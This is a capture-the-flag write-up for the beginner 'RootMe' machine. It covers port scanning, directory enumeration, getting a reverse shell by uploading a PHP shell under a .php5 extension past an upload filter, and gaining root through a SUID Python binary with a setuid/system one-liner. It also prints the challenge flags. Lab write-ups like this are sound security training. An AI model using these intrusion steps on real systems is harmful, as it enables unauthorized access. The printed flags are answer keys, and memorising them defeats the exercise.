**Tristan Gomez**

# RootMe

### Description

`A ctf for beginners, can you root me?`

### Reconnaissance 

I'm going to do my usual opening for these types of challenges. I will run a SYN scan in nmap to see what ports are open.

```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~]
└─$ sudo nmap -sS -Pn 10.10.0.131
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 15:58 PDT
Nmap scan report for 10.10.0.131
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.90 seconds

```
**Question 1: Scan the machine, how many ports are open?**
* There are two ports open, 22 and 80.

My next step will be to use `gobuster` to see what pages exist for the website.

```
/uploads              (Status: 301) [Size: 312] [--> http://10.10.0.131/uploads/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.0.131/css/]    
/js                   (Status: 301) [Size: 307] [--> http://10.10.0.131/js/]     
/panel                (Status: 301) [Size: 310] [--> http://10.10.0.131/panel/] 
```

After finding the above pages, I decided to navigate to `/uploads`. There I found the version
of Apache being used.

**Question 2: What version of Apache is running?**
* `Apache/2.4.29 (Ubuntu) Server at 10.10.0.131 Port 80`

**Question 3: What service is running on port 22?**
* ssh


**Question 3: What is the hidden directory?**
* `/panel/`

### Getting a shell
* `Find a form to upload and get a reverse shell, and find the flag.`

I navigated to the `/panel` page, which is a file upload page. It seems as though we can abuse this functionality to get
a reverse shell. I attempted to upload a bash script to get a reverse shell to no avail. I looked in my `/usr/share/webshells` folder to see what came with my `kali` installation. I found a `php-reverse-shell.php` scipt/file. I attempted to upload it to the page, but was greeted with a warning.
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../css/panel.css">
    <script src=../"js/maquina_de_escrever.js"></script>
    <title>HackIT - Home</title>
</head>
<body>
    <div class="first">
        <div class="main-div">
            <form action="" method="POST" enctype="multipart/form-data">
                <p>Select a file to upload:</p>
                <input type="file" name="fileUpload" class="fileUpload">
                <input type="submit" value="Upload" name="submit">
                
                <p class='erro'>PHP não é permitido!</p>            </form>
        </div>
    </div>
</body>
</html>

```

Darn, I can't upload `.php` files....or can I? There are oh so mamy `.ph????` extensions. Let's try a different one.
I went with `.php5`, but others should work as well. <br />

Before I uploaded the file, I ran `netcat` on my machine so that I can actually use the reverse shell.
When I upload the `.php5` file, I get a success message. No sign of a shell though...hmm. Ah, if we go back to the 
`/uploads` page, we can see our file. If we attempt to open it, the `.php5` file is executed and I get 

```
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1111
Ncat: Listening on 0.0.0.0:1111
Ncat: Connection from 10.10.0.131.
Ncat: Connection from 10.10.0.131:36170.
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:34:56 up 38 min,  0 users,  load average: 0.00, 0.00, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

*I'm in* <br />

For this part of the challenge, we need to find the flag which is in `user.txt`. I am going to run
`find -type f -name user.txt`. We get back

```
...
find: './proc/915/task/915/ns': Permission denied
find: './proc/915/fd': Permission denied
find: './proc/915/map_files': Permission denied
find: './proc/915/fdinfo': Permission denied
find: './proc/915/ns': Permission denied
find: './proc/1261/task/1261/fd': Permission denied
find: './proc/1261/task/1261/fdinfo': Permission denied
find: './proc/1261/task/1261/ns': Permission denied
find: './proc/1261/fd': Permission denied
find: './proc/1261/map_files': Permission denied
find: './proc/1261/fdinfo': Permission denied
find: './proc/1261/ns': Permission denied
./var/www/user.txt
find: './var/spool/rsyslog': Permission denied
find: './var/spool/cron/atjobs': Permission denied
find: './var/spool/cron/crontabs': Permission denied
find: './var/spool/cron/atspool': Permission denied
find: './var/log/apache2': Permission denied
...
```

Lots of `Permission denied` but conspicuously we see our target and we can directly access it.
```
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

### Privilege escalation 
* `Now that we have a shell, let's escalate our privileges to root.`


For this next question we need to find files with `set user id` permissions (`4000`). I ran
`find -perm /4000` and got

```
...
find: './etc/ssl/private': Permission denied
find: './etc/polkit-1/localauthority': Permission denied
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/snapd/snap-confine
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/bin/traceroute6.iputils
./usr/bin/newuidmap
./usr/bin/newgidmap
./usr/bin/chsh
./usr/bin/python
./usr/bin/at
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/passwd
./usr/bin/pkexec
find: './proc/tty/driver': Permission denied
find: './proc/1/task/1/fd': Permission denied
find: './proc/1/task/1/fdinfo': Permission denied
find: './proc/1/task/1/ns': Permission denied
...
```

Again, lots of `Permission denied` messages, but something stand out here.

**Question 4: Search for files with SUID permission, which file is weird?**
* `/usr/bin/python`


Taking a bit of a deeper look at python
```
ls -l /usr/bin/python
-rwsr-sr-x 1 root root 3665768 Aug  4  2020 python

```

Looks like we can execute python, but I'm not sure how to leverage this for my gain.
I needed to consult the hint `Search for gtfobins`. On `https://gtfobins.github.io/`, I found what I was looking for.
The below command, leverages Python to get us `root` privileges. 

```
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Running a quit `whoami` after running python yields

```
$ python -c 'import os; os.setuid(0); os.system("/bin/sh")'
whoami
root
```

Woo! Now all thats left is to find the last flag. I decided to `cd` into `/root` and ran `ls`. 
Looks like only one file is there. Let's cat it and finish this up.

```
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}

```
